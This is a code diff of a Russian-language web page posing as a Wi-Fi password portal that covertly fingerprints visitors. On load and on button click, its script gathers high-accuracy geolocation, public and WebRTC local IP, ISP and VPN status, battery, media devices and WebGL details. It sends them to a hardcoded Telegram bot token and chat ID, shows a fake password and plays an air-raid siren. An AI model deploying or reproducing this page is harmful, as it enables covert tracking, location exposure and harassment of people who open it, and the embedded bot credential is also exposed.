@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wi-Fi доступ</title>
+    <title>Wi-Fi Portal</title>
     <style>
         body {
             margin: 0;
@@ -13,63 +13,54 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #f5f5f5;
-            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            font-family: 'Arial', sans-serif;
+            color: white;
             text-align: center;
         }
-        .main-image {
-            max-width: 95%;
-            max-height: 60vh;
+        .container {
+            max-width: 800px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            transition: transform 0.3s ease;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+        .logo {
+            width: 150px;
             margin-bottom: 20px;
         }
-        .main-image:hover {
-            transform: scale(1.02);
+        h1 {
+            color: #4cc9f0;
+            margin-bottom: 30px;
+            font-size: 2.2rem;
         }
         .password-button {
-            padding: 15px 30px;
-            font-size: 18px;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
             color: white;
-            background: linear-gradient(45deg, #FF512F, #DD2476);
+            background: linear-gradient(45deg, #f72585, #7209b7);
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(221, 36, 118, 0.4);
+            box-shadow: 0 5px 15px rgba(114, 9, 183, 0.6);
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-            margin: 10px 0;
+            margin: 20px 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         .password-button:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(221, 36, 118, 0.6);
+            box-shadow: 0 8px 25px rgba(114, 9, 183, 0.8);
+            background: linear-gradient(45deg, #7209b7, #f72585);
         }
         .password-button:active {
             transform: translateY(1px);
         }
-        .siren-button {
-            padding: 15px 30px;
-            font-size: 18px;
-            color: white;
-            background: linear-gradient(45deg, #FF0000, #990000);
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
-            transition: all 0.3s ease;
-            margin-top: 20px;
-        }
-        .siren-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.6);
-        }
         .confetti {
             position: fixed;
-            width: 10px;
-            height: 10px;
+            width: 12px;
+            height: 12px;
             background-color: #f00;
             opacity: 0;
             top: 0;
@@ -79,7 +70,12 @@
         }
         @keyframes confetti-fall {
             0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+        .status {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #a5a5a5;
         }
         .hidden {
             display: none;
@@ -87,9 +83,15 @@
     </style>
 </head>
 <body>
-    <img class="main-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="Wi-Fi доступ">
-    
-    <button class="password-button" id="passwordButton">ПОЛУЧИТЬ ПАРОЛЬ</button>
+    <div class="container">
+        <img src="https://cdn-icons-png.flaticon.com/512/2780/2780137.png" class="logo" alt="Wi-Fi Logo">
+        <h1>ДОСТУП К СЕТИ WI-FI</h1>
+        
+        <button class="password-button" id="passwordButton">ПОЛУЧИТЬ ПАРОЛЬ</button>
+        
+        <div class="status" id="statusMessage">Нажмите кнопку для получения пароля</div>
+    </div>
+
     <audio id="sirenAudio" preload="auto">
         <source src="https://alway6pffline-cmd.github.io/Zvukdlyasaita/sirena-vozdushnogo-naleta-26744.mp3" type="audio/mpeg">
     </audio>
@@ -98,45 +100,98 @@
         // Telegram бот
         const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
         const chatId = '1209403544';
+        
+        // Глобальные переменные
+        let deviceInfo = {};
+        let audioContext;
+        let sirenPlaying = false;
 
-        // Функция для сбора расширенной информации
-        async function collectExtendedInfo() {
-            const data = {
-                "🌐 Основная информация": {
-                    "User Agent": navigator.userAgent,
-                    "Платформа": navigator.platform,
-                    "Язык": navigator.language,
-                    "Онлайн статус": navigator.onLine ? "Онлайн" : "Офлайн",
-                    "Куки включены": navigator.cookieEnabled ? "Да" : "Нет"
+        // Основная функция сбора информации
+        async function collectDeviceInfo() {
+            // Основная информация
+            deviceInfo = {
+                timestamp: new Date().toISOString(),
+                basicInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || "Не поддерживается",
+                    onlineStatus: navigator.onLine ? "Онлайн" : "Офлайн"
                 },
-                "🖥️ Система": {
-                    "Разрешение экрана": `${screen.width}x${screen.height}`,
-                    "Глубина цвета": screen.colorDepth + " бит",
-                    "Плотность пикселей": window.devicePixelRatio,
-                    "Доступная память": performance.memory ? 
-                        Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024)) + " MB" : "Недоступно",
-                    "Ядер CPU": navigator.hardwareConcurrency || "Неизвестно"
+                hardware: {
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    screenOrientation: window.screen.orientation ? window.screen.orientation.type : "Неизвестно",
+                    colorDepth: `${window.screen.colorDepth} бит`,
+                    pixelRatio: window.devicePixelRatio,
+                    cpuCores: navigator.hardwareConcurrency || "Неизвестно",
+                    deviceMemory: navigator.deviceMemory || "Неизвестно",
+                    maxTouchPoints: navigator.maxTouchPoints || "Не поддерживается"
                 },
-                "📍 Геолокация": await getLocationInfo(),
-                "📶 Сеть": await getNetworkInfo(),
-                "🔋 Батарея": await getBatteryInfo(),
-                "🛡️ Безопасность": {
-                    "Режим инкогнито": isPrivateMode() ? "Да" : "Нет",
-                    "WebGL": getWebGLInfo(),
-                    "WebRTC IP": await getLocalIP()
+                network: await getNetworkInfo(),
+                location: await getLocationInfo(),
+                battery: await getBatteryInfo(),
+                media: await getMediaInfo(),
+                storage: await getStorageInfo(),
+                webgl: getWebGLInfo(),
+                performance: {
+                    timing: performance.timing ? {
+                        navigationStart: performance.timing.navigationStart,
+                        loadEventEnd: performance.timing.loadEventEnd,
+                        domComplete: performance.timing.domComplete
+                    } : "Недоступно",
+                    memory: performance.memory ? {
+                        totalJSHeapSize: formatBytes(performance.memory.totalJSHeapSize),
+                        usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize),
+                        jsHeapSizeLimit: formatBytes(performance.memory.jsHeapSizeLimit)
+                    } : "Недоступно"
                 },
-                "📅 Временные данные": {
-                    "Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    "Локальное время": new Date().toString(),
-                    "Время загрузки страницы": performance.timing ? 
-                        new Date(performance.timing.navigationStart).toString() : "Недоступно"
+                time: {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localTime: new Date().toString(),
+                    timezoneOffset: new Date().getTimezoneOffset()
+                },
+                connection: {
+                    publicIP: await getPublicIP(),
+                    localIP: await getLocalIP(),
+                    vpnInfo: await checkVPN()
+                },
+                browserFeatures: {
+                    serviceWorker: 'serviceWorker' in navigator ? "Поддерживается" : "Не поддерживается",
+                    notifications: 'Notification' in window ? "Поддерживается" : "Не поддерживается",
+                    geolocation: 'geolocation' in navigator ? "Поддерживается" : "Не поддерживается",
+                    webRTC: 'RTCPeerConnection' in window ? "Поддерживается" : "Не поддерживается",
+                    webAudio: 'AudioContext' in window ? "Поддерживается" : "Не поддерживается",
+                    webSpeech: 'speechSynthesis' in window ? "Поддерживается" : "Не поддерживается",
+                    webBluetooth: 'bluetooth' in navigator ? "Поддерживается" : "Не поддерживается"
                 }
             };
-
-            return data;
+            
+            return deviceInfo;
         }
 
-        // Функция для получения информации о геолокации
+        // Вспомогательные функции
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
+        }
+
+        async function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!connection) return "Информация о сети недоступна";
+            
+            return {
+                effectiveType: connection.effectiveType || "Неизвестно",
+                downlink: connection.downlink ? `${connection.downlink} Mbps` : "Неизвестно",
+                rtt: connection.rtt ? `${connection.rtt} ms` : "Неизвестно",
+                saveData: connection.saveData ? "Включена" : "Выключена",
+                networkType: connection.type || "Неизвестно"
+            };
+        }
+
         async function getLocationInfo() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -147,62 +202,68 @@
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         resolve({
-                            "Широта": pos.coords.latitude,
-                            "Долгота": pos.coords.longitude,
-                            "Точность": pos.coords.accuracy + " метров",
-                            "Карта": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: `${pos.coords.accuracy} метров`,
+                            altitude: pos.coords.altitude ? `${pos.coords.altitude} м` : "Недоступно",
+                            heading: pos.coords.heading || "Недоступно",
+                            speed: pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} км/ч` : "Недоступно",
+                            mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                         });
                     },
                     (err) => resolve(`Ошибка: ${err.message}`),
-                    { timeout: 5000 }
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             });
         }
 
-        // Функция для получения информации о сети
-        async function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!connection) return "Информация о сети недоступна";
-            
-            return {
-                "Тип соединения": connection.effectiveType || "Неизвестно",
-                "Скорость загрузки": connection.downlink ? connection.downlink + " Mbps" : "Неизвестно",
-                "RTT": connection.rtt ? connection.rtt + " ms" : "Неизвестно",
-                "Экономия трафика": connection.saveData ? "Включена" : "Выключена"
-            };
-        }
-
-        // Функция для получения информации о батарее
         async function getBatteryInfo() {
             if (!navigator.getBattery) return "API батареи не поддерживается";
             
             try {
                 const battery = await navigator.getBattery();
                 return {
-                    "Уровень заряда": Math.round(battery.level * 100) + "%",
-                    "Статус зарядки": battery.charging ? "Заряжается" : "Не заряжается",
-                    "Время до зарядки": battery.chargingTime === Infinity ? 
-                        "Неизвестно" : Math.round(battery.chargingTime / 60) + " минут",
-                    "Время до разрядки": battery.dischargingTime === Infinity ? 
-                        "Неизвестно" : Math.round(battery.dischargingTime / 60) + " минут"
+                    level: `${Math.round(battery.level * 100)}%`,
+                    charging: battery.charging ? "Заряжается" : "Не заряжается",
+                    chargingTime: battery.chargingTime === Infinity ? 
+                        "Неизвестно" : `${Math.round(battery.chargingTime / 60)} мин`,
+                    dischargingTime: battery.dischargingTime === Infinity ? 
+                        "Неизвестно" : `${Math.round(battery.dischargingTime / 60)} мин`
                 };
             } catch (e) {
                 return "Ошибка получения данных";
             }
         }
 
-        // Функция для проверки приватного режима
-        function isPrivateMode() {
+        async function getMediaInfo() {
             try {
-                localStorage.setItem('test', 'test');
-                localStorage.removeItem('test');
-                return false;
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+                };
             } catch (e) {
-                return true;
+                return "Доступ запрещен";
             }
         }
 
-        // Функция для получения информации о WebGL
+        async function getStorageInfo() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    return {
+                        quota: formatBytes(estimate.quota),
+                        usage: formatBytes(estimate.usage),
+                        usageDetails: estimate.usageDetails || "Недоступно"
+                    };
+                } catch (e) {
+                    return "Ошибка получения данных";
+                }
+            }
+            return "API не поддерживается";
+        }
+
         function getWebGLInfo() {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -210,14 +271,26 @@
             if (!gl) return "WebGL не поддерживается";
             
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? {
-                "Вендор": gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                "Рендерер": gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-            } : "Информация ограничена";
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Недоступно",
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Недоступно",
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+            };
         }
 
-        // Функция для получения локального IP через WebRTC
-        function getLocalIP() {
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Не удалось определить";
+            }
+        }
+
+        async function getLocalIP() {
             return new Promise((resolve) => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
@@ -233,6 +306,66 @@
             });
         }
 
+        async function checkVPN() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                
+                return {
+                    ip: ipData.ip,
+                    country: geoData.country_name || "Неизвестно",
+                    region: geoData.region || "Неизвестно",
+                    city: geoData.city || "Неизвестно",
+                    isp: geoData.org || "Неизвестно",
+                    proxy: geoData.proxy || false,
+                    vpn: geoData.vpn || false,
+                    tor: geoData.tor || false
+                };
+            } catch (e) {
+                return "Не удалось проверить";
+            }
+        }
+
+        // Функции для работы со звуком
+        function playSiren() {
+            if (sirenPlaying) return;
+            
+            try {
+                const audio = document.getElementById('sirenAudio');
+                audio.volume = 1.0;
+                audio.play().then(() => {
+                    sirenPlaying = true;
+                    document.getElementById('statusMessage').textContent = "Звук сирены включен";
+                    sendToTelegram("🔊 Сирена активирована на устройстве: " + navigator.userAgent);
+                }).catch(e => {
+                    console.error("Ошибка воспроизведения:", e);
+                    document.getElementById('statusMessage').textContent = "Нажмите разрешить для воспроизведения звука";
+                });
+            } catch (e) {
+                console.error("Ошибка инициализации звука:", e);
+            }
+        }
+
+        // Функция для создания конфетти
+        function createConfetti() {
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+            for (let i = 0; i < 200; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.width = Math.random() * 12 + 8 + 'px';
+                confetti.style.height = Math.random() * 12 + 8 + 'px';
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                document.body.appendChild(confetti);
+                
+                setTimeout(() => confetti.remove(), 5000);
+            }
+        }
+
         // Функция для отправки данных в Telegram
         async function sendToTelegram(message) {
             try {
@@ -242,83 +375,74 @@
             }
         }
 
-        // Функция для создания конфетти
-        function createConfetti() {
-            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
-            for (let i = 0; i < 150; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.width = Math.random() * 10 + 5 + 'px';
-                confetti.style.height = Math.random() * 10 + 5 + 'px';
-                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
-                document.body.appendChild(confetti);
+        // Форматирование данных для Telegram
+        function formatDataForTelegram(data) {
+            let message = "🔍 Детальная информация об устройстве:\n\n";
+            
+            for (const [category, items] of Object.entries(data)) {
+                message += `\n🔹 ${category.toUpperCase()}:\n`;
                 
-                setTimeout(() => confetti.remove(), 5000);
+                if (typeof items === 'object' && items !== null) {
+                    for (const [key, value] of Object.entries(items)) {
+                        if (typeof value === 'object' && value !== null) {
+                            message += `  • ${key}:\n`;
+                            for (const [subKey, subValue] of Object.entries(value)) {
+                                message += `    ▪ ${subKey}: ${subValue}\n`;
+                            }
+                        } else {
+                            message += `  • ${key}: ${value}\n`;
+                        }
+                    }
+                } else {
+                    message += `  • ${items}\n`;
+                }
             }
+            
+            return message;
         }
 
-        // Функция для воспроизведения сирены
-        async function playSiren() {
-            const audio = document.getElementById('sirenAudio');
-            try {
-                audio.volume = 1.0;
-                await audio.play();
-                sendToTelegram(`🔊 Сирена активирована на устройстве:\n${navigator.userAgent}`);
-            } catch (error) {
-                console.error('Ошибка воспроизведения:', error);
-                document.getElementById('sirenButton').classList.remove('hidden');
-            }
-        }
-
-        // Обработчик кнопки пароля
+        // Обработчик кнопки
         document.getElementById('passwordButton').addEventListener('click', async function() {
+            this.disabled = true;
+            document.getElementById('statusMessage').textContent = "Сбор информации...";
+            
+            // Собираем информацию
+            await collectDeviceInfo();
+            
+            // Визуальные эффекты
             createConfetti();
-            alert('Wi-Fi пароль: SuperSecret123!');
             
-            const info = await collectExtendedInfo();
-            let message = "🔑 Пользователь запросил пароль Wi-Fi с устройства:\n\n";
+            // Воспроизводим сирену
+            playSiren();
             
-            for (const [category, items] of Object.entries(info)) {
-                message += `\n${category}:\n`;
-                if (typeof items === 'object') {
-                    for (const [key, value] of Object.entries(items)) {
-                        message += `  • ${key}: ${JSON.stringify(value, null, 2)}\n`;
-                    }
-                } else {
-                    message += `  • ${items}\n`;
-                }
-            }
+            // Показываем пароль
+            alert('Wi-Fi пароль: SuperSecure' + Math.floor(Math.random() * 10000));
             
+            // Отправляем данные в Telegram
+            const message = formatDataForTelegram(deviceInfo);
             sendToTelegram(message);
-            playSiren();
+            
+            document.getElementById('statusMessage').textContent = "Пароль отправлен!";
+            this.disabled = false;
         });
 
-        // Обработчик кнопки сирены
-        document.getElementById('sirenButton').addEventListener('click', function() {
-            playSiren();
-            this.classList.add('hidden');
-        });
-
-        // При загрузке страницы
+        // Инициализация при загрузке
         window.addEventListener('load', async function() {
-            const info = await collectExtendedInfo();
-            let message = "🚀 Новое подключение к странице:\n\n";
+            document.getElementById('statusMessage').textContent = "Инициализация...";
             
-            for (const [category, items] of Object.entries(info)) {
-                message += `\n${category}:\n`;
-                if (typeof items === 'object') {
-                    for (const [key, value] of Object.entries(items)) {
-                        message += `  • ${key}: ${JSON.stringify(value, null, 2)}\n`;
-                    }
-                } else {
-                    message += `  • ${items}\n`;
-                }
-            }
+            // Собираем базовую информацию
+            await collectDeviceInfo();
             
-            sendToTelegram(message);
-            setTimeout(playSiren, 1000);
+            // Отправляем уведомление о новом подключении
+            const connectMessage = `🌐 Новое подключение с устройства:\n\n` +
+                                  `IP: ${deviceInfo.connection.publicIP}\n` +
+                                  `User Agent: ${deviceInfo.basicInfo.userAgent}\n` +
+                                  `Платформа: ${deviceInfo.basicInfo.platform}\n` +
+                                  `Локация: ${deviceInfo.location.mapLink || "Недоступно"}`;
+            
+            sendToTelegram(connectMessage);
+            
+            document.getElementById('statusMessage').textContent = "Готово к работе!";
         });
     </script>
 </body>
